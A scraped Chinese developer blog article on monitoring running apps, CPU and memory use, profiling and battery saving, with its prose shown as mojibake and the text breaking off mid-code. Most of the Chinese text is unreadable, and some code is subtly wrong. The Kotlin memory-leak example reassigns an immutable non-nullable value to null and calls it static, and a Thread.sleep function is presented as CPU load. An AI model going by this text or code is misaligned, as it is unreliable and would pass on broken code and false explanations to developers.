                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æŒæ¡è®¾å¤‡çŠ¶æ€ï¼šç›‘æ§ä¸ç®¡ç†æ­£åœ¨è¿è¡Œçš„app</p>
<p>ç®€ä»‹ï¼šæ™ºèƒ½æ‰‹æœºç”¨æˆ·äº†è§£å’Œç›‘æ§æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºå¯¹äºä¼˜åŒ–æ€§èƒ½ã€ç®¡ç†å†…å­˜å’Œä¿æŠ¤éšç§è‡³å…³é‡è¦ã€‚æœ¬æ–‡å°†æŒ‡å¯¼å¦‚ä½•æŸ¥çœ‹å’Œç®¡ç†Androidå’ŒiOSè®¾å¤‡ä¸Šçš„å½“å‰æ´»è·ƒè¿›ç¨‹ã€‚é€šè¿‡ç³»ç»Ÿè‡ªå¸¦åŠŸèƒ½å’Œç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œç”¨æˆ·å¯ä»¥ç›‘æ§åº”ç”¨çš„CPUä½¿ç”¨ã€å†…å­˜å ç”¨ï¼Œå¹¶è¿›è¡Œæ€§èƒ½ä¼˜åŒ–ã€ç”µé‡èŠ‚çœå’Œæ•…éšœæ’æŸ¥ã€‚æ­¤å¤–ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ç³»ç»ŸæœåŠ¡APIæ·±å…¥äº†è§£åå°è¿›ç¨‹ä¿¡æ¯ï¼Œä»¥æå‡appè´¨é‡ã€‚</p>
<h2 data-id="heading-0">1. æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„appæ–¹æ³•</h2>
<p>åœ¨ç°ä»£æ“ä½œç³»ç»Ÿä¸­ï¼Œäº†è§£å¦‚ä½•æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºå¯¹äºæ€§èƒ½ç›‘æ§å’Œæ•…éšœæ’æŸ¥è‡³å…³é‡è¦ã€‚è¿™ä¸€ç« èŠ‚å°†æ¢è®¨æŸ¥çœ‹è¿è¡Œåº”ç”¨çš„å‡ ç§æ–¹æ³•ï¼Œå¸®åŠ©ITä¸“ä¸šäººå‘˜å¿«é€Ÿè¯†åˆ«å’Œç®¡ç†æ­£åœ¨æ¶ˆè€—ç³»ç»Ÿèµ„æºçš„åº”ç”¨ã€‚</p>
<h3 data-id="heading-1">1.1 ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦å·¥å…·æŸ¥çœ‹è¿è¡Œä¸­çš„åº”ç”¨</h3>
<p>å¤§å¤šæ•°æ“ä½œç³»ç»Ÿéƒ½é…å¤‡äº†æŸ¥çœ‹å½“å‰è¿è¡Œåº”ç”¨çš„å†…ç½®å·¥å…·ã€‚ä¾‹å¦‚ï¼Œåœ¨Windowsç³»ç»Ÿä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨ï¼ˆTask Managerï¼‰ï¼Œè€Œåœ¨macOSä¸Šï¼Œå¯ä»¥ä½¿ç”¨æ´»åŠ¨ç›‘è§†å™¨ï¼ˆActivity Monitorï¼‰ã€‚è¿™äº›å·¥å…·ä¸ä»…å¯ä»¥å±•ç¤ºåº”ç”¨åˆ—è¡¨ï¼Œè¿˜å¯ä»¥æä¾›CPUã€å†…å­˜å’Œç½‘ç»œä½¿ç”¨æƒ…å†µç­‰é‡è¦ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-2">1.2 ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·</h3>
<p>é™¤äº†å›¾å½¢ç•Œé¢å·¥å…·ä¹‹å¤–ï¼Œå‘½ä»¤è¡Œå·¥å…·ä¹Ÿæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”çµæ´»çš„é€‰æ‹©ã€‚ä¾‹å¦‚ï¼Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯ä»¥ä½¿ç”¨ <code>top</code> æˆ– <code>htop</code> å‘½ä»¤å¿«é€ŸæŸ¥çœ‹æ‰€æœ‰è¿è¡Œä¸­çš„è¿›ç¨‹ã€‚é€šè¿‡è¿™äº›å‘½ä»¤è¡Œå·¥å…·ï¼ŒITä¸“ä¸šäººå‘˜å¯ä»¥è·å¾—æ›´å¤šçš„ç»†èŠ‚ä¿¡æ¯ï¼Œæ¯”å¦‚è¿›ç¨‹IDã€å¯åŠ¨æ—¶é—´ä»¥åŠå…·ä½“çš„èµ„æºå ç”¨ç‡ç­‰ã€‚</p>
<pre><code class="hljs">
htop
</code></pre>
<h3 data-id="heading-3">1.3 ç¬¬ä¸‰æ–¹åº”ç”¨ç›‘æ§å·¥å…·</h3>
<p>é™¤ç³»ç»Ÿè‡ªå¸¦å’Œå‘½ä»¤è¡Œå·¥å…·ä¹‹å¤–ï¼Œå¸‚åœºä¸Šè¿˜æœ‰è®¸å¤šç¬¬ä¸‰æ–¹åº”ç”¨ç›‘æ§å·¥å…·ï¼Œå®ƒä»¬å¾€å¾€å…·æœ‰æ›´é«˜çº§çš„åŠŸèƒ½ï¼Œä¾‹å¦‚è·¨å¹³å°æŸ¥çœ‹ã€å†å²æ•°æ®è®°å½•å’Œè¯¦ç»†çš„æ€§èƒ½åˆ†ææŠ¥å‘Šã€‚è¿™ç±»å·¥å…·å¯¹äºéœ€è¦åœ¨å¤šæ“ä½œç³»ç»Ÿæˆ–å¤§å‹ä¼ä¸šç¯å¢ƒä¸­è¿›è¡Œæ€§èƒ½ç›‘æ§çš„ITä¸“ä¸šäººå‘˜å°¤å…¶æœ‰ç”¨ã€‚å¯¹äºiOSå¼€å‘ï¼ŒKeymobæä¾›å…¨é¢çš„æ€§èƒ½ç›‘æ§ã€æ–‡ä»¶ç®¡ç†å’Œæ—¥å¿—åˆ†æåŠŸèƒ½ï¼Œå¸®åŠ©å¼€å‘è€…æ·±å…¥ä¼˜åŒ–åº”ç”¨æ€§èƒ½å¹¶æå‡å¼€å‘æ•ˆç‡ã€‚</p>
<p>è¿™ä¸€ç« èŠ‚ä¸ºITä¸“ä¸šäººå‘˜æä¾›äº†ä¸€ä¸ªå…¥é—¨çº§åˆ«çš„æŒ‡å¯¼ï¼Œå¸®åŠ©ä»–ä»¬å¼€å§‹ç›‘æ§å’Œç®¡ç†è¿è¡Œä¸­çš„åº”ç”¨ç¨‹åºã€‚åç»­ç« èŠ‚å°†æ·±å…¥æ¢è®¨æ›´é«˜çº§çš„ç›‘æ§å’Œä¼˜åŒ–æŠ€å·§ã€‚</p>
<h2 data-id="heading-4">2. ç›‘æ§è®¾å¤‡èµ„æºä½¿ç”¨</h2>
<h4 data-id="heading-5">2.1 ç›‘æ§CPUä½¿ç”¨ç‡</h4>
<h5 data-id="heading-6">2.1.1 CPUä½¿ç”¨ç‡çš„æ„ä¹‰</h5>
<p>CPUä½œä¸ºè®¡ç®—æœºç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œå…¶æ€§èƒ½ç›´æ¥å½±å“åˆ°åº”ç”¨ç¨‹åºçš„è¿è¡Œæ•ˆç‡å’Œæ•´ä¸ªç³»ç»Ÿçš„å“åº”é€Ÿåº¦ã€‚CPUä½¿ç”¨ç‡æ˜¯è¡¡é‡CPUè´Ÿè½½æ°´å¹³çš„å…³é”®æŒ‡æ ‡ï¼Œå®ƒåæ˜ äº†CPUåœ¨æ‰§è¡Œä»»åŠ¡æ—¶çš„å¿™ç¢Œç¨‹åº¦ã€‚ç›‘æ§CPUä½¿ç”¨ç‡æœ‰åŠ©äºå¼€å‘è€…åŠæ—¶å‘ç°æ€§èƒ½ç“¶é¢ˆï¼Œä¼˜åŒ–åº”ç”¨ç¨‹åºï¼Œé¿å…å› è¿‡è½½è€Œå¼•èµ·çš„ç³»ç»Ÿæ•…éšœã€‚</p>
<h5 data-id="heading-7">2.1.2 ç›‘æ§å·¥å…·å’Œæ–¹æ³•</h5>
<p><strong>å‘½ä»¤è¡Œå·¥å…·ï¼š</strong></p>
<p>Linuxç³»ç»Ÿä¸­å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·åŒ…æ‹¬ <code>top</code> , <code>htop</code> , <code>vmstat</code> , <code>iostat</code> ç­‰ã€‚è¿™äº›å·¥å…·å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œï¼Œæä¾›å®æ—¶çš„ç³»ç»ŸçŠ¶æ€å’Œæ€§èƒ½æ•°æ®ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">
top
sudo apt-get install htop
htop
</code></pre>
<p>ä»¥ä¸Šå‘½ä»¤ä¼šå±•ç¤ºç³»ç»Ÿå½“å‰çš„èµ„æºä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬CPUã€å†…å­˜ã€è¿›ç¨‹ç­‰ä¿¡æ¯ã€‚</p>
<p><strong>GUIå·¥å…·ï¼š</strong></p>
<p>å¦‚ <code>System Monitor</code> ï¼ˆç³»ç»Ÿç›‘è§†å™¨ï¼‰æˆ– <code>Resource Monitor</code> ï¼ˆèµ„æºç›‘è§†å™¨ï¼‰ï¼Œè¿™äº›å›¾å½¢ç•Œé¢å·¥å…·å¯ä»¥æä¾›æ›´ç›´è§‚çš„æ•°æ®å±•ç¤ºã€‚</p>
<p><strong>ç¼–ç¨‹ç›‘æ§ï¼š</strong></p>
<p>å¯¹äºå¼€å‘è€…è€Œè¨€ï¼Œç¼–ç¨‹è¯­è¨€æä¾›çš„åº“æˆ–APIå¯ä»¥é›†æˆåˆ°åº”ç”¨ä¸­ï¼Œå®ç°æ›´ç»†ç²’åº¦çš„ç›‘æ§ã€‚</p>
<pre><code class="hljs language-python" lang="python">
<span class="hljs-keyword">import</span> psutil
cpu_usage = psutil.cpu_percent(interval=<span class="hljs-number">1</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å½“å‰CPUä½¿ç”¨ç‡: <span class="hljs-subst">{cpu_usage}</span>%"</span>)
</code></pre>
<h4 data-id="heading-8">2.2 ç›‘æ§å†…å­˜ä½¿ç”¨æƒ…å†µ</h4>
<h5 data-id="heading-9">2.2.1 å†…å­˜æ³„æ¼çš„å½±å“</h5>
<p>å†…å­˜æ³„æ¼æ˜¯åº”ç”¨ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¸æ–­æ¶ˆè€—å†…å­˜èµ„æºï¼Œå´æœªèƒ½æœ‰æ•ˆé‡Šæ”¾å·²åˆ†é…çš„å†…å­˜ï¼Œå¯¼è‡´éšç€æ—¶é—´æ¨ç§»å¯ç”¨å†…å­˜é€æ¸å‡å°‘çš„ç°è±¡ã€‚å†…å­˜æ³„æ¼ä¼šé€ æˆåº”ç”¨ç¨‹åºæ€§èƒ½ä¸‹é™ï¼Œç³»ç»Ÿè¿è¡Œç¼“æ…¢ï¼Œä¸¥é‡çš„å†…å­˜æ³„æ¼ç”šè‡³ä¼šå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚</p>
<h5 data-id="heading-10">2.2.2 å†…å­˜ç›‘æ§çš„å®è·µæŠ€å·§</h5>
<p><strong>å†…å­˜ä½¿ç”¨é‡ç›‘æ§ï¼š</strong></p>
<p>é€šè¿‡è§‚å¯Ÿç³»ç»Ÿçš„å†…å­˜ä½¿ç”¨æ€»é‡ä»¥åŠå„ä¸ªè¿›ç¨‹çš„å†…å­˜å ç”¨æƒ…å†µï¼Œå¯ä»¥åŠæ—¶å‘ç°å†…å­˜ä½¿ç”¨çš„å¼‚å¸¸æƒ…å†µã€‚</p>
<pre><code class="hljs language-c" lang="c">
<span class="hljs-built_in">free</span> -h
</code></pre>
<pre><code class="hljs language-bash" lang="bash">
ps -o pid,<span class="hljs-built_in">comm</span>,rss,args -C [process_name]
</code></pre>
<p><strong>å†…å­˜æ³„æ¼æ£€æµ‹å·¥å…·ï¼š</strong></p>
<p>å†…å­˜æ³„æ¼æ£€æµ‹é€šå¸¸éœ€è¦ä½¿ç”¨ç‰¹å®šçš„å·¥å…·ï¼Œå¦‚Valgrindï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æºçš„ç¨‹åºåˆ†æå·¥å…·ï¼Œèƒ½å¤Ÿæ£€æµ‹ç¨‹åºä¸­çš„å†…å­˜æ³„æ¼ç­‰é—®é¢˜ã€‚</p>
<pre><code class="hljs language-css" lang="css">
sudo apt-get install valgrind
valgrind <span class="hljs-attr">--leak-check</span>=full <span class="hljs-selector-attr">[program]</span>
</code></pre>
<p>ä»¥ä¸Šå‘½ä»¤ä¼šè¿è¡Œç¨‹åºå¹¶æ£€æŸ¥å†…å­˜æ³„æ¼ã€‚</p>
<p>æ­¤å¤–ï¼Œè®¸å¤šé›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰å¦‚Eclipseã€IntelliJ IDEAç­‰ä¹Ÿæä¾›äº†å†…å­˜æ³„æ¼æ£€æµ‹åŠŸèƒ½ã€‚é€šè¿‡é›†æˆè¿™äº›å·¥å…·ï¼Œå¼€å‘è€…å¯ä»¥åœ¨å¼€å‘è¿‡ç¨‹ä¸­å®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨æƒ…å†µï¼Œå¿«é€Ÿå®šä½å†…å­˜æ³„æ¼é—®é¢˜ã€‚</p>
<p>é€šè¿‡ä¸Šè¿°çš„CPUå’Œå†…å­˜ç›‘æ§æ–¹æ³•ï¼Œå¯ä»¥ç¡®ä¿åº”ç”¨å’Œç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œä¸ºç”¨æˆ·æä¾›æ›´æµç•…çš„ä½¿ç”¨ä½“éªŒã€‚ä¸‹ä¸€ç« å°†æ·±å…¥æ¢è®¨æ€§èƒ½ä¼˜åŒ–å’Œç”µé‡èŠ‚çœç­–ç•¥ï¼Œä»¥è¿›ä¸€æ­¥æå‡åº”ç”¨æ€§èƒ½ã€‚</p>
<h2 data-id="heading-11">3. æ€§èƒ½ä¼˜åŒ–å’Œç”µé‡èŠ‚çœç­–ç•¥</h2>
<p>æ€§èƒ½ä¼˜åŒ–å’Œç”µé‡èŠ‚çœæ˜¯ä»»ä½•åº”ç”¨å¼€å‘è€…éƒ½å¿…é¡»é¢å¯¹çš„ä¸¤å¤§æŒ‘æˆ˜ã€‚éšç€ç”¨æˆ·å¯¹ç§»åŠ¨è®¾å¤‡çš„ä¾èµ–æ—¥ç›Šå¢åŠ ï¼Œåº”ç”¨çš„å“åº”é€Ÿåº¦å’Œç”µæ± ç»­èˆªèƒ½åŠ›ç›´æ¥å½±å“ç”¨æˆ·ä½“éªŒã€‚æœ¬ç« å°†æ·±å…¥æ¢è®¨æ€§èƒ½ä¼˜åŒ–çš„åŸºç¡€çŸ¥è¯†ï¼ŒåŒ…æ‹¬æ€§èƒ½ç“¶é¢ˆåˆ†æå’Œä¼˜åŒ–å·¥å…·çš„ä½¿ç”¨ï¼Œä»¥åŠç”µé‡èŠ‚çœçš„ç­–ç•¥å’Œæ–¹æ³•ã€‚</p>
<h3 data-id="heading-12">3.1 æ€§èƒ½ä¼˜åŒ–åŸºç¡€</h3>
<p>æ€§èƒ½ä¼˜åŒ–æ—¨åœ¨æé«˜åº”ç”¨çš„è¿è¡Œé€Ÿåº¦ã€æ•ˆç‡å’Œå“åº”èƒ½åŠ›ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆè¦è¯†åˆ«å’Œåˆ†æåº”ç”¨çš„æ€§èƒ½ç“¶é¢ˆï¼Œç„¶ååˆ©ç”¨å„ç§ä¼˜åŒ–å·¥å…·å’ŒæŠ€æœ¯è¿›è¡Œé’ˆå¯¹æ€§çš„æ”¹è¿›ã€‚</p>
<h4 data-id="heading-13">3.1.1 åº”ç”¨æ€§èƒ½ç“¶é¢ˆåˆ†æ</h4>
<p>åº”ç”¨æ€§èƒ½ç“¶é¢ˆæ˜¯æŒ‡é‚£äº›é™åˆ¶åº”ç”¨æ€§èƒ½è¾¾åˆ°æœ€ä¼˜çŠ¶æ€çš„å› ç´ ã€‚è¿™äº›ç“¶é¢ˆå¯èƒ½æ¥æºäºä»£ç å±‚é¢çš„ç®—æ³•æ•ˆç‡é—®é¢˜ã€æ•°æ®ç»“æ„é€‰æ‹©ä¸å½“ã€èµ„æºäº‰ç”¨ç­‰ã€‚æ­¤å¤–ï¼Œåº”ç”¨å¯¹ç³»ç»Ÿèµ„æºçš„è¿‡åº¦æ¶ˆè€—ï¼Œå¦‚CPUå’Œå†…å­˜çš„é«˜ä½¿ç”¨ç‡ï¼Œä¹Ÿå¯èƒ½æˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚</p>
<p>åˆ†ææ€§èƒ½ç“¶é¢ˆé€šå¸¸ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢å…¥æ‰‹ï¼š</p>
<ul>
<li><strong>ä»£ç å‰–æï¼ˆProfilingï¼‰</strong> ï¼šä½¿ç”¨ä»£ç å‰–æå·¥å…·ï¼ˆå¦‚Android Studioä¸­çš„Profilerå·¥å…·ï¼‰æ¥ç›‘æ§åº”ç”¨çš„CPUã€å†…å­˜å’Œç½‘ç»œä½¿ç”¨æƒ…å†µã€‚</li>
<li><strong>æ€§èƒ½æµ‹è¯•</strong> ï¼šç¼–å†™è‡ªåŠ¨åŒ–æµ‹è¯•è„šæœ¬æ¥æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œï¼Œå¹¶æµ‹é‡åº”ç”¨çš„å“åº”æ—¶é—´å’Œèµ„æºæ¶ˆè€—ã€‚</li>
<li><strong>ç”¨æˆ·åé¦ˆ</strong> ï¼šæ”¶é›†ç”¨æˆ·åœ¨çœŸå®ä½¿ç”¨åœºæ™¯ä¸‹çš„åé¦ˆä¿¡æ¯ï¼Œäº†è§£æ€§èƒ½é—®é¢˜çš„å®é™…æƒ…å†µã€‚</li>
</ul>
<h4 data-id="heading-14">3.1.2 ä¼˜åŒ–å·¥å…·å’Œå®è·µæ¡ˆä¾‹</h4>
<p>é’ˆå¯¹æ€§èƒ½ç“¶é¢ˆï¼Œå¼€å‘è€…å¯ä»¥åˆ©ç”¨å¤šç§å·¥å…·è¿›è¡Œä¼˜åŒ–ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ä¼˜åŒ–å·¥å…·å’Œå®è·µæ¡ˆä¾‹ï¼š</p>
<ul>
<li><strong>CPU Profiler</strong> ï¼šé€šè¿‡CPU Profilerå¯ä»¥æŸ¥çœ‹åº”ç”¨åœ¨è¿è¡Œæ—¶çš„CPUä½¿ç”¨æƒ…å†µã€‚å·¥å…·æä¾›äº†ç«ç„°å›¾ï¼ˆFlame Graphï¼‰æ¥ç›´è§‚å±•ç¤ºæ–¹æ³•è°ƒç”¨çš„è€—æ—¶åˆ†å¸ƒï¼Œä¾¿äºå‘ç°è€—æ—¶è¾ƒé•¿çš„æ–¹æ³•ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performTask</span><span class="hljs-params">()</span></span> {
    Thread.sleep(<span class="hljs-number">5000</span>)
}
</code></pre>
<p>ä»¥ä¸Šä»£ç ä¸­çš„ <code>performTask</code> å‡½æ•°å°†æ¨¡æ‹Ÿé•¿æ—¶é—´çš„CPUä½¿ç”¨ï¼Œè¿™åœ¨CPU Profilerä¸­å°†è¡¨ç°ä¸ºä¸€ä¸ªçƒ­ç‚¹ï¼ˆHotspotï¼‰ã€‚</p>
<ul>
<li><strong>Memory Profiler</strong> ï¼šMemory Profileræœ‰åŠ©äºæ£€æµ‹å†…å­˜æ³„æ¼å’Œå†…å­˜ä½¿ç”¨æ³¢åŠ¨ã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡åˆ†æå†…å­˜åˆ†é…å’Œå›æ”¶çš„æ¨¡å¼æ¥è¯†åˆ«æ½œåœ¨çš„å†…å­˜é—®é¢˜ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">AppCompatActivity</span>() {
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context = <span class="hljs-keyword">this</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
<span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onDestroy</span><span class="hljs-params">()</span></span> {
<span class="hljs-keyword">super</span>.onDestroy()
        context = <span class="hljs-literal">null</span>
    }
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ <code>MainActivity</code> ç±»é€šè¿‡ä¸€ä¸ªé™æ€å˜é‡æŒæœ‰äº†å¯¹è‡ªèº«çš„å¼•ç”¨ï¼Œå¦‚æœåœ¨ <code>onDestroy</code> ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­ä¸å°†è¯¥é™æ€å˜é‡è®¾ç½®ä¸º <code>null</code> ï¼Œå°±å¯èƒ½å¼•èµ·å†…å­˜æ³„æ¼ã€‚</p>
<ul>
<li><strong>Benchmarking Libraries</strong> ï¼šå¯¹äºéœ€è¦è¿›è¡Œæ€§èƒ½åŸºå‡†æµ‹è¯•çš„åœºæ™¯ï¼Œå¯ä»¥ä½¿ç”¨å¦‚Android Benchmark Harnessï¼ˆABHï¼‰ç­‰æµ‹è¯•æ¡†æ¶æ¥æµ‹é‡ä»£ç çš„æ‰§è¡Œæ—¶é—´ã€‚</li>
</ul>
<h3 data-id="heading-15">3.2 ç”µé‡èŠ‚çœæŠ€å·§</h3>
<p>ç”µæ± ç»­èˆªèƒ½åŠ›å¯¹äºç§»åŠ¨è®¾å¤‡æ¥è¯´è‡³å…³é‡è¦ï¼Œä¼˜åŒ–åº”ç”¨ä»¥å‡å°‘ç”µé‡æ¶ˆè€—å¯ä»¥æ˜¾è‘—æå‡ç”¨æˆ·ä½“éªŒã€‚</p>
<h4 data-id="heading-16">3.2.1 ç”µé‡æ¶ˆè€—çš„å¸¸è§åŸå› </h4>
<p>åº”ç”¨åœ¨åå°è¿è¡Œã€é¢‘ç¹çš„ç½‘ç»œè¯·æ±‚ã€é«˜é¢‘ç‡çš„GPSå®šä½æ›´æ–°ã€å±å¹•äº®åº¦è°ƒæ•´ä»¥åŠCPUå’Œå†…å­˜èµ„æºçš„è¿‡åº¦ä½¿ç”¨éƒ½æ˜¯å¯¼è‡´ç”µé‡æ¶ˆè€—çš„å¸¸è§åŸå› ã€‚</p>
<ul>
<li><strong>åå°æœåŠ¡</strong> ï¼šæ— é™åˆ¶çš„åå°æœåŠ¡ä¼šæ¶ˆè€—CPUèµ„æºï¼Œé—´æ¥å¯¼è‡´ç”µé‡æ¶ˆè€—ã€‚</li>
<li><strong>ç½‘ç»œæ´»åŠ¨</strong> ï¼šç½‘ç»œè¯·æ±‚ï¼Œå°¤å…¶æ˜¯æ— çº¿ç½‘ç»œè¯·æ±‚ï¼Œæ˜¯ç”µæ± ä½¿ç”¨å¤§æˆ·ã€‚</li>
<li><strong>å±å¹•äº®åº¦</strong> ï¼šå±å¹•äº®åº¦è°ƒèŠ‚ä¸ºæœ€é«˜æ—¶ï¼Œç”µé‡æ¶ˆè€—ä¼šæ˜¾è‘—å¢åŠ ã€‚</li>
</ul>
<h4 data-id="heading-17">3.2.2 å®ç°ç”µé‡èŠ‚çœçš„ç­–ç•¥å’Œæ–¹æ³•</h4>
<p>ä¸ºäº†é™ä½åº”ç”¨çš„ç”µé‡æ¶ˆè€—ï¼Œå¼€å‘è€…å¯ä»¥é‡‡å–ä»¥ä¸‹ç­–ç•¥å’Œæ–¹æ³•ï¼š</p>
<ul>
<li><strong>ä¼˜åŒ–åå°æœåŠ¡</strong> ï¼šé™åˆ¶åå°æœåŠ¡çš„ä½¿ç”¨ï¼Œä»…åœ¨å¿…è¦æ—¶å”¤é†’æœåŠ¡è¿›è¡Œå·¥ä½œã€‚</li>
<li><strong>å‡å°‘ç½‘ç»œè¯·æ±‚</strong> ï¼šåˆå¹¶å¤šä¸ªå°çš„ç½‘ç»œè¯·æ±‚ä¸ºä¸€ä¸ªå¤§çš„è¯·æ±‚ï¼Œå‡å°‘è¯·æ±‚æ¬¡æ•°ï¼Œå‡å°‘æ•°æ®ä¼ è¾“ã€‚</li>
<li><strong>æ§åˆ¶å±å¹•äº®åº¦</strong> ï¼šåœ¨åº”ç”¨å†…è®¾ç½®åˆç†çš„å±å¹•äº®åº¦ï¼Œæˆ–è€…ä½¿ç”¨ç³»ç»Ÿæä¾›çš„äº®åº¦æ§åˆ¶APIã€‚</li>
<li><strong>ä½¿ç”¨çœç”µAPI</strong> ï¼šåˆ©ç”¨å¹³å°æä¾›çš„çœç”µæ¨¡å¼APIï¼Œå¦‚åœ¨Androidä¸­å¯ä»¥ä½¿ç”¨ <code>Doze Mode</code> å’Œ <code>App Standby</code> æ¥å‡å°‘åœ¨åå°çš„ç”µæ± æ¶ˆè€—ã€‚</li>
</ul>
<pre><code class="hljs language-scss" lang="scss">
if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) {
PowerManager powerManager = (PowerManager) <span class="hljs-built_in">getSystemService</span>(POWER_SERVICE);
